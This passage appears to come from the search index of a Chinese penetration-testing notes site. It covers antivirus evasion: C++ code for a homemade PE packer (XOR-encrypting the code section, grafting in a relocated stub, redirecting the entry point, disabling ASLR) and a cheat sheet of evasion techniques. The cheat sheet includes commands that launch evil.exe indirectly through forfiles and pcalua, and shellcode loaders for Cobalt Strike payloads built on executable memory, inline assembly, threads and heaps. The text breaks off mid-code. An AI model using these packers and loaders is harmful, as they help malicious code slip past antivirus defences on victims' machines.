//\u4ee3\u7801\u6bb5RVA DWORD textScnSize; //\u4ee3\u7801\u6bb5\u7684\u5927\u5c0f DWORD key; //\u89e3\u5bc6\u5bc6\u94a5 }StubConf; struct StubInfo { char* dllbase; //stub.dll\u7684\u52a0\u8f7d\u57fa\u5740 DWORD pfnStart; //stub.dll(start)\u5bfc\u51fa\u51fd\u6570\u7684\u5730\u5740 StubConf* pStubConf; //stub.dll(g_conf)\u5bfc\u51fa\u5168\u5c40\u53d8\u91cf\u7684\u5730\u5740 };","title":"\u8bf8\u591a\u81ea\u5b9a\u51fd\u6570&amp;\u7ed3\u6784\u4f53"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#pe","text":"\u8fd9\u91cc\u91c7\u7528\u7684\u65b9\u6cd5\u662f\u5229\u7528CreateFileA\u51fd\u6570\u3002\u540c\u65f6\u8fd9\u4e2a\u51fd\u6570\u8fd8\u629b\u51fa\u4e86\u4e00\u4e2a\u6307\u5411PE\u6587\u4ef6\u5927\u5c0f\u7684\u6307\u9488 char* GetFileHmoudle(_In_ const char* path,_Out_opt_ DWORD* nFileSize) { //\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u5e76\u83b7\u5f97\u6587\u4ef6\u53e5\u67c4 HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //\u83b7\u5f97\u6587\u4ef6\u5927\u5c0f DWORD FileSize = GetFileSize(hFile, NULL); //\u8fd4\u56de\u6587\u4ef6\u5927\u5c0f\u5230\u53d8\u91cfnFileSize if(nFileSize) *nFileSize = FileSize; //\u7533\u8bf7\u4e00\u7247\u5927\u5c0f\u4e3aFileSize\u7684\u5185\u5b58\u5e76\u5c06\u6307\u9488\u7f6e\u4e8e\u9996\u4f4d char* pFileBuf = new CHAR[FileSize]{ 0 }; //\u7ed9\u521a\u521a\u7533\u8bf7\u7684\u5185\u5b58\u8bfb\u5165\u6570\u636e DWORD dwRead; ReadFile(hFile, pFileBuf, FileSize, &dwRead, NULL); CloseHandle(hFile); return pFileBuf; }","title":"\u6253\u5f00PE\u6587\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#stub_1","text":"void LoadStub(_In_ StubInfo* pstub) { pstub->dllbase = (char*)LoadLibraryEx(L\"F:\\\\stubdll.dll\", NULL, DONT_RESOLVE_DLL_REFERENCES); pstub->pfnStart = (DWORD)GetProcAddress((HMODULE)pstub->dllbase, \"Start\"); //\u83b7\u5f97stub\u7684\u5165\u53e3\u51fd\u6570Start(\u81ea\u5df1\u5b9a\u4e49\u5728stub\u4e2d\u7684\u4e00\u4e2a\u51fd\u6570 pstub->pStubConf = (StubConf*)GetProcAddress((HMODULE)pstub->dllbase, \"g_conf\"); } //\u4e0d\u4ec5\u52a0\u8f7d\u4e86stub\uff0c\u8fd8\u83b7\u5f97\u4e86stub\u629b\u51fa\u7684\u7528\u4e8e\u6536\u96c6\u4fe1\u606f\u7684\u5168\u5c40\u7ed3\u6784\u4f53\uff08g_conf,\u662f\u4e00\u4e2astub\u629b\u51fa\u7684\u7ed3\u6784\u4f53\uff0c\u7528\u4e8e\u83b7\u53d6\u4fe1\u606f\uff0c\u7ed3\u6784\u5982\u4e0b\uff09 typedef struct _StubConf { DWORD srcOep; //\u5165\u53e3\u70b9 DWORD textScnRVA; //\u4ee3\u7801\u6bb5RVA DWORD textScnSize; //\u4ee3\u7801\u6bb5\u7684\u5927\u5c0f DWORD key; //\u89e3\u5bc6\u5bc6\u94a5 }StubConf;","title":"\u52a0\u8f7dSTUB"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#_10","text":"DWORD textRVA = GetSecByName(PeHmoudle, \".text\")->VirtualAddress; DWORD textSize = GetSecByName(PeHmoudle, \".text\")->Misc.VirtualSize; Encry(PeHmoudle,pstub); void Encry(_In_ char* hpe,_In_ StubInfo pstub) { //\u83b7\u53d6\u4ee3\u7801\u6bb5\u9996\u5730\u5740 BYTE* TargetText = GetSecByName(hpe, \".text\")->PointerToRawData + (BYTE*)hpe; //\u83b7\u53d6\u4ee3\u7801\u6bb5\u5927\u5c0f DWORD TargetTextSize = GetSecByName(hpe, \".text\")->Misc.VirtualSize; //\u52a0\u5bc6\u4ee3\u7801\u6bb5 for (int i = 0; i < TargetTextSize; i++) { TargetText[i] ^= 0x15; } pstub.pStubConf->textScnRVA = GetSecByName(hpe, \".text\")->VirtualAddress; pstub.pStubConf->textScnSize = TargetTextSize; pstub.pStubConf->key = 0x15; } //\u52a0\u5bc6\u4ee3\u7801\u6bb5\uff0c\u5e76\u7ed9\u4e88\u4e86stub\u4e00\u4e9b\u4fe1\u606f","title":"\u52a0\u5bc6\u4ee3\u7801\u6bb5"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#_11","text":"char* AddSec(_In_ char*& hpe, _In_ DWORD& filesize, _In_ const char* secname, _In_ const int secsize) { GetFileHeader(hpe)->NumberOfSections++; PIMAGE_SECTION_HEADER pesec = GetLastSec(hpe); //\u8bbe\u7f6e\u533a\u6bb5\u8868\u5c5e\u6027 memcpy(pesec->Name, secname, 8); pesec->Misc.VirtualSize = secsize; pesec->VirtualAddress = (pesec - 1)->VirtualAddress + AlignMent((pesec - 1)->SizeOfRawData,GetOptHeader(hpe)->SectionAlignment); pesec->SizeOfRawData = AlignMent(secsize, GetOptHeader(hpe)->FileAlignment); pesec->PointerToRawData = AlignMent(filesize,GetOptHeader(hpe)->FileAlignment); pesec->Characteristics = 0xE00000E0; //\u8bbe\u7f6eOPT\u5934\u6620\u50cf\u5927\u5c0f GetOptHeader(hpe)->SizeOfImage = pesec->VirtualAddress + pesec->SizeOfRawData; //\u6269\u5145\u6587\u4ef6\u6570\u636e int newSize = pesec->PointerToRawData + pesec->SizeOfRawData; char* nhpe = new char [newSize] {0}; //\u5411\u65b0\u7f13\u51b2\u533a\u5f55\u5165\u6570\u636e memcpy(nhpe, hpe, filesize); //\u7f13\u5b58\u533a\u66f4\u66ff delete hpe; filesize = newSize; return nhpe; }","title":"\u6dfb\u52a0\u65b0\u533a\u6bb5"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#stub_2","text":"\u597d\u5bb6\u4f19\uff0c\u8fd9\u4e2a\u4e1c\u897f\u7a0d\u6709\u4e0d\u614e\u5c31\u4f1a\u8ba9\u6574\u4e2a\u7a0b\u5e8f\u62c9\u8de8\u6389\uff08\u8fc7\u6765\u4eba\u7684\u5fe0\u544a \u4e3a\u4ec0\u4e48\u9700\u8981stub\u91cd\u5b9a\u4f4d\u5462\uff1f\u56e0\u4e3a\u6211\u4eec\u7684stub\u6700\u5f00\u59cb\u662f\u52a0\u8f7d\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u5b83\u7684\u8bb8\u591a\u6307\u4ee4\u5982\u8df3\u8f6c\u5230\u7684\u5730\u5740\u662f\u6309\u5185\u5b58\u4e3a\u57fa\u51c6\u786e\u5b9a\u7684\uff0c\u4f46\u662f\u6211\u4eec\u9700\u8981\u628a\u4ed6\u79fb\u690d\u8fdb\u6587\u4ef6\uff0c\u6240\u4ee5\u5b83\u7684\u4ee3\u7801\u91cc\u8bb8\u591a\u5730\u5740\u5c31\u662f\u9519\u8bef\u7684\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u8fd9\u4e9b\u5730\u5740\u8fdb\u884c\u5904\u7406\uff0c\u5373\u91cd\u5b9a\u4f4d\uff0c\u4f7f\u5176\u4ee5\u5bbf\u4e3b\u7a0b\u5e8f\u4e3a\u6807\u51c6\u8fdb\u884c\u5730\u5740\u4fee\u590d\u3002 \u53ef\u80fd\u6211\u8868\u8ff0\u7684\u4e0d\u662f\u5f88\u6e05\u695a\ud83d\ude25\u4e3e\u4e2a\u4f8b\u5b50\u5427\uff0c\u6bd4\u5982stub\u5728\u52a0\u8f7d\u8fdb\u5185\u5b58\u65f6\uff0c\u6709\u4e00\u6761\u8df3\u8f6c\u6307\u4ee4\u65f6jmp 12345678, \u5982\u679c\u6211\u4eec\u4e0d\u5904\u7406\u5c31\u628a\u8fd9\u6761\u6307\u4ee4\u79fb\u690d\u8fdbPE\u6587\u4ef6\uff0c\u90a3\u4e48PE\u6587\u4ef6\u6267\u884c\u5230\u6b64\u5904\u65f6\u5c31\u4f1a\u8df3\u8f6c\u523012345678\uff0c\u6b64\u65f6\u768412345678\u5730\u5740\u53ef\u80fd\u5c31\u5df2\u7ecf\u4e0d\u662fPE\u6587\u4ef6\u52a0\u8f7d\u7684\u5185\u5b58\u533a\u95f4\u4e86\uff0c\u4ece\u800c\u7a0b\u5e8f\u4f1a\u5d29\u6e83\u3002\u6240\u4ee5\u8981\u4fee\u590d\u3002\u6839\u636estub\u7684\u91cd\u5b9a\u4f4d\u8868\u8fdb\u884c\u4fee\u590d\u3002 \u91cd\u5b9a\u4f4d\u8868\u5c31\u662f\u8bb0\u5f55\u54ea\u4e9b\u5730\u5740\u7684\u6570\u636e\u9700\u8981\u88ab\u4fee\u590d\u7684\uff0c\u6211\u4eec\u904d\u5386\u8fd9\u4e9b\u5730\u5740\u8fdb\u884c\u4fee\u590d\u5373\u53ef\u3002 \u5982\u679c\u4ee5\u4e0b\u4ee3\u7801\u770b\u8d77\u6765\u5403\u529b\uff0c\u53ef\u4ee5\u5148\u53bb\u4e86\u89e3\u4e00\u4e0b\u91cd\u5b9a\u4f4d\u8868 void FixStub(DWORD targetDllbase, DWORD stubDllbase,DWORD targetNewScnRva,DWORD stubTextRva ) { //\u627e\u5230stub.dll\u7684\u91cd\u5b9a\u4f4d\u8868 DWORD dwRelRva = GetOptHeader((char*)stubDllbase)->DataDirectory[5].VirtualAddress; IMAGE_BASE_RELOCATION* pRel = (IMAGE_BASE_RELOCATION*)(dwRelRva + stubDllbase); //\u904d\u5386\u91cd\u5b9a\u4f4d\u8868 while (pRel->SizeOfBlock) { struct TypeOffset { WORD offset : 12; WORD type : 4; }; TypeOffset* pTypeOffset = (TypeOffset*)(pRel + 1); DWORD dwCount = (pRel->SizeOfBlock - 8) / 2; //\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u6570\u91cf for (int i = 0; i < dwCount; i++) { if (pTypeOffset[i].type != 3) { continue; } //\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u5730\u5740 DWORD* pFixAddr = (DWORD*)(pRel->VirtualAddress + pTypeOffset[i].offset + stubDllbase); DWORD dwOld; //\u4fee\u6539\u5c5e\u6027\u4e3a\u53ef\u5199 VirtualProtect(pFixAddr, 4, PAGE_READWRITE, &dwOld); //\u53bb\u6389dll\u5f53\u524d\u52a0\u8f7d\u57fa\u5740 *pFixAddr -= stubDllbase; //\u53bb\u6389\u9ed8\u8ba4\u7684\u6bb5\u9996RVA *pFixAddr -= stubTextRva; //\u6362\u4e0a\u76ee\u6807\u6587\u4ef6\u7684\u52a0\u8f7d\u57fa\u5740 *pFixAddr += targetDllbase; //\u52a0\u4e0a\u65b0\u533a\u6bb5\u7684\u6bb5\u9996RVA *pFixAddr += targetNewScnRva; //\u628a\u5c5e\u6027\u4fee\u6539\u56de\u53bb VirtualProtect(pFixAddr, 4, dwOld, &dwOld); } //\u5207\u6362\u5230\u4e0b\u4e00\u4e2a\u91cd\u5b9a\u4f4d\u5757 pRel = (IMAGE_BASE_RELOCATION*)((DWORD)pRel + pRel->SizeOfBlock); }","title":"stub\u91cd\u5b9a\u4f4d"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#stub_3","text":"\u8fd9\u4e2a\u7b80\u5355\uff0c\u6ca1\u5565\u8bf4\u7684 memcpy(GetLastSec(PeNewHmoudle)->PointerToRawData+ PeNewHmoudle, GetSecByName(pstub.dllbase, \".text\")->VirtualAddress+pstub.dllbase, GetSecByName(pstub.dllbase,\".text\")->Misc.VirtualSize);","title":"stub\u79fb\u690d"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#_12","text":"GetOptHeader(PeNewHmoudle)->AddressOfEntryPoint = pstub.pfnStart-(DWORD)pstub.dllbase-GetSecByName(pstub.dllbase,\".text\")->VirtualAddress+GetLastSec(PeNewHmoudle)->VirtualAddress;","title":"\u5165\u53e3\u70b9\u4fee\u6539"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#_13","text":"\u4e0d\u53bb\u6389\u968f\u673a\u57fa\u5740\uff0c\u52a0\u8f7d\u57fa\u5740\u5c31\u662f\u4e0d\u56fa\u5b9a\u7684\uff0c\u4e0d\u65b9\u4fbf\u64cd\u4f5c GetOptHeader(PeNewHmoudle)->DllCharacteristics &= (~0x40);","title":"\u53bb\u968f\u673a\u57fa\u5740"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#_14","text":"void SaveFile(_In_ const char* path, _In_ const char* data, _In_ int FileSize) { HANDLE hFile = CreateFileA( path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL ); DWORD Buf = 0; WriteFile(hFile, data, FileSize, &Buf,NULL); CloseHandle(hFile); }","title":"\u4fdd\u5b58\u6587\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#_15","text":"\u7b2c\u4e00\u6b21\u641e\u5e95\u5c42\u7684\u73a9\u610f\u513f\uff0c\u5bfc\u81f4\u8c03\u8bd5\u8fd9\u4e1c\u897f\u82b1\u4e86\u6211\u4e0d\u5c11\u65f6\u95f4\u3002\u3002 \u4e0d\u8fc7\u5b66\u7684\u8fd8\u662f\uff1f\u86ee\u591a\u7684\uff1f \u52a8\u6001\u8c03\u8bd5\uff0cc++\uff0c\u6c47\u7f16\uff0cPE\u7ed3\u6784\uff0c\u52a8\u6001\u5bfb\u5740\u90fd\u5b66\u5230\u4e86\u4e9b\u3002\uff08\u600e\u4e48\u611f\u89c9\u5728\u5f80\u9006\u5411\u8d70\u4e862333 \u7ee7\u7eed\u5f04\u5427\uff0c\u8fd9\u4e2a\u9879\u76ee\u76ee\u524d\u8fd8\u6709bug\uff0c\u7b49\u4ee5\u540e\u6765\u4e86\u5174\u8da3\u518d\u7ee7\u7eed\u6dfb\u52a0\u66f4\u591a\u66f4\u725b\u903c\u7684\u673a\u5236\u3002","title":"\u540e\u8bb0"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/","text":"\u57fa\u7840\u514d\u6740\u624b\u6cd5\u66b4\u98ce\u5438\u5165 \u76ee\u5f55 EXE \u52a0\u58f3 \u6dfb\u52a0\u6570\u5b57\u7b7e\u540d \u95f4\u63a5\u8fd0\u884cexe forfiles pcalua cmd Hijack conhost explorer.exe C++ shellcode\u5904\u7406 \u6307\u9488\u6267\u884c+\u7533\u8bf7\u5185\u5b58\u52a8\u6001\u52a0\u8f7dshellcode \u5185\u8054\u6c47\u7f16\u52a0\u8f7dshellcode \u521b\u5efa\u7ebf\u7a0b\u6267\u884cshellcode \u4f7f\u7528\u8f85\u52a9\u5806\u6808\u52a0\u8f7dshellcode HTTP\u534f\u8bae\u8fdc\u7a0b\u8bfb\u53d6shellcode \u4f7f\u7528\u56de\u8c03\u51fd\u6570\u52a0\u8f7dshellcode \u4f7f\u7528\u52a0\u8f7d\u5668\u52a0\u8f7dshellcode shellcode_ launcher \u52a0\u8f7d\u5668 SSI \u52a0\u8f7d\u5668 \u81ea\u5199\u52a0\u8f7d\u5668 shellcode\u53d8\u5f62 UUID\u53d8\u5f62 shellcode\u6ce8\u5165\u8fdb\u7a0b\u5185\u5b58 \u6ce8\u5165\u5df2\u6709\u8fdb\u7a0b \u53cd\u8c03\u8bd5 \u76f4\u63a5\u5224\u65ad\u662f\u5426\u4e3a\u8c03\u8bd5\u72b6\u6001 \u68c0\u6d4b\u8f6f\u4ef6\u65ad\u70b9 \u65f6\u95f4\u68c0\u6d4b \u68c0\u6d4b\u7236\u8fdb\u7a0b SEH\u4e2d\u65ad \u6c99\u7bb1\u7ed5\u8fc7\uff08Sandbox Evasion\uff09 System Checks \u68c0\u6d4b\u51fd\u6570\u662f\u5426\u88abHOOK\u66f4\u6539 GetTickCount CPU,RAM\u7b49\u4fe1\u606f mac \u5206\u8fa8\u7387 \u68c0\u67e5\u65f6\u533a\u4e0e\u65f6\u95f4\u6d41\u52a8\u6027 \u68c0\u6d4b\u6587\u4ef6\u540d\u662f\u5426\u88ab\u6c99\u7bb1\u66f4\u6539 Time-Based Evasion \u4f7f\u7528\u7f51\u7edc\u8fde\u63a5\u5b9e\u65f6\u8bfb\u53d6\u542f\u52a8\u6307\u4ee4 User Activity Based Checks \u9f20\u6807\u79fb\u52a8\u8f68\u8ff9 \u68c0\u6d4b\u7236\u8fdb\u7a0b \u8fdb\u7a0b\u9542\u7a7a \u52a8\u6001\u8c03\u7528API Powershell \u8fdc\u7a0b\u6267\u884c\u4e0e\u672c\u5730\u6267\u884c \u8fdc\u7a0b\u6267\u884c \u672c\u5730\u6267\u884c \u547d\u4ee4\u62c6\u5206 GO FUNNY \u751f\u6210EXE \u7533\u8bf7\u5185\u5b58\u52a0\u8f7dshellcode \u7b80\u5355XOR \u6c99\u76d2&\u865a\u62df\u673a\u68c0\u6d4b \u865a\u62df\u673a\uff1a\u654f\u611f\u6587\u4ef6\u68c0\u6d4b \u8fdc\u7a0b\u8bfbshellcode \u8bfb\u53d6\u6587\u4ef6\u4e2d\u7684SHELLCODE \u6587\u4ef6\u91ca\u653e \u524d\u9762\u7684\u8bdd:\u201d\u514d\u6740\u4e00\u822c\u90fd\u662f\u9760\u7ec4\u5408\u62f3\u201d EXE \u52a0\u58f3 \u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684\u3002\u53ef\u4ee5\u81ea\u5199\u52a0\u58f3\u5668\u7b49\u7b49 \u6dfb\u52a0\u6570\u5b57\u7b7e\u540d \u4e0d\u540c\u7684\u6740\u8f6f\u5bf9\u6570\u5b57\u7b7e\u540d\u7684\u654f\u611f\u6027\u4e0d\u540c\uff0c\u6709\u4e9b\u6740\u8f6f\u53ef\u80fd\u53ea\u68c0\u67e5\u4e00\u4e0b\u6709\u6ca1\u6709\u6570\u5b57\u7b7e\u540d\u5c31\u8fc7\u4e86\uff0c\u6709\u4e9b\u6740\u8f6f\u53ef\u80fd\u8981\u53bb\u9a8c\u8bc1\u4e00\u4e0b\u6570\u5b57\u7b7e\u540d\u7684\u6b63\u786e\u6027\uff0c\u6709\u4e9b\u53ef\u80fd\u7ba1\u90fd\u4e0d\u7ba1\u6570\u5b57\u7b7e\u540d\u3002\u53ea\u80fd\u8bf4\u6dfb\u52a0\u6570\u5b57\u7b7e\u540d\u80fd\u7a0d\u5fae\u63d0\u5347\u4e00\u4e0bexe\u7684\u514d\u6740\u51e0\u7387\u3002 \u95f4\u63a5\u8fd0\u884cexe \u5e73\u65f6\u6211\u4eec\u8fd0\u884c\u4e00\u4e2aexe\uff1a cmd /c c:\\a.exe \u4f46\u8fd9\u6837\u5bb9\u6613\u88ab\u6740\u6216\u8005\u547d\u4ee4\u88abban\u3002\u6240\u6709\u5c31\u6709\u4e00\u4e9b\u95f4\u63a5\u8fd0\u884cexe\u7684\u65b9\u6cd5 forfiles forfiles\u662f\u4e00\u4e2a\u7528\u4e8e\u6279\u5904\u7406\u7684\u4e00\u4e2a\u5de5\u5177\uff0c\u5b83\u5728\u627e\u5230\u6587\u4ef6\u540e\u4f1a\u6267\u884c\u6307\u5b9a\u7684\u547d\u4ee4. forfiles /p \u6307\u5b9a\u641c\u7d22\u6587\u4ef6\u7684\u76ee\u5f55 /m \u6307\u5b9a\u641c\u7d22\u5173\u952e\u8bcd /c \u6307\u5b9a\u8981\u6267\u884c\u7684\u547d\u4ee4 forfiles /p c:\\windows\\system32 /m calc.exe /c c:\\tmp\\evil.exe //evil.exe\u4f1a\u6210\u4e3aforfiles.exe\u7684\u5b50\u8fdb\u7a0b pcalua pcalua -a c:\\tmp\\evil.exe //evil.exe\u4e0d\u4f1a\u6210\u4e3a\u5b50\u8fdb\u7a0b cmd Hijack \u4e0b\u9762\u547d\u4ee4\u5c06\u5f39\u8ba1\u7b97\u5668 cmd.exe /c \"ping 127.0.0.1/../../../../../../../../../../../windows/system32/calc.exe\" cmd.exe /c \"ping ;a.exe; 127.0.0.1/../../../../../../../../../windows/system32/calc.exe\" ping ;a.exe 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe conhost \u5927\u4e8ewin7\u53ef\u7528 conhost c:\\windows\\system32\\calc.exe conhost adsadas/../../../../../../../../../windows/system32/calc.exe \u4ee5\u4e0b\u6307\u4ee4win10\u67d0\u4e9b\u7248\u672c\u65e0\u6cd5\u4f7f\u7528 conhost \"asddas c:\\windows\\system32\\calc.exe\" explorer.exe explorer.exe c:\\windows\\system32\\calc.exe explorer asdsadasd,\"c:\\windows\\system32\\calc.exe\" C++ shellcode\u5904\u7406 \u6307\u9488\u6267\u884c+\u7533\u8bf7\u5185\u5b58\u52a8\u6001\u52a0\u8f7dshellcode \u9996\u5148\u4ececobalt strike\u4e0a\u751f\u6210\u62ff\u5230shellcode\u7528\u4f5c\u672c\u6b21\u6d4b\u8bd5\u3002 \u7136\u540e\u901a\u8fc7\u4e0b\u9762\u7684\u4ee3\u7801\uff0c\u76f4\u63a5\u6267\u884c\u5199\u6b7b\u5728\u7a0b\u5e8f\u91cc\u7684shellcode\u3002 #include <iostream> #include<Windows.h> int main() { unsigned char buf[] = \"shellcode\"; void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, buf, sizeof buf); ((void(*)())exec)(); return 0; } \u53ef\u4ee5\u770b\u89c1\uff0c\u8fd8\u662f\u5f88\u62c9\u8de8\u7684\u3002 \u5185\u8054\u6c47\u7f16\u52a0\u8f7dshellcode c++\u6709\u5f3a\u5927\u7684\u5185\u8054\u6c47\u7f16\u529f\u80fd\uff0c\u4e0a\u6b21\u5199\u58f3\u7684\u65f6\u5019\u5c31\u611f\u53d7\u4e86\u4e00\u756a\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5185\u8054\u6c47\u7f16\u4ee3\u7801\u52a0\u8f7dshellcode.\u987a\u4fbf\u52a0\u82b1\u4ec0\u4e48\u7684\uff0c\u90fd\u53ef\u4ee5\u5f04\u3002 #include <iostream> #include<Windows.h> #include<winhttp.h> #pragma comment(lib, \"winhttp.lib\") #pragma comment(lib,\"user32.lib\") int main() { unsigned char buf[] = \"shellcode\"; _asm { lea eax, buf; jmp eax; } } \u8fd8\u662f\u86ee\u62c9\u8de8\u7684\uff0c\u867d\u7136\u6211\u6ca1\u6709\u52a0\u82b1\u3002 \u521b\u5efa\u7ebf\u7a0b\u6267\u884cshellcode unsigned char buf[] = \"shellcode\"; void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, buf, sizeof buf); DWORD dwThreadId = 0; HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)exec, NULL, NULL, &dwThreadId); WaitForSingleObject(hThread, INFINITE); \u4f7f\u7528\u8f85\u52a9\u5806\u6808\u52a0\u8f7dshellcode heapcreate \u53ef\u4ee5\u521b\u5efa\u8f85\u52a9\u5806\u6808\u5e76\u8bbe\u7f6e\u5806\u6808\u5c5e\u6027\uff0c\u7136\u540e\u7528heapalloc\u5206\u914d\u5806\u6808\u5927\u5c0f char shellcode[] = \"\"; HANDLE hHep = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0); PVOID Mptr = HeapAlloc(hHep, 0, sizeof(shellcode)); RtlCopyMemory(Mptr, shellcode, sizeof(shellcode)); 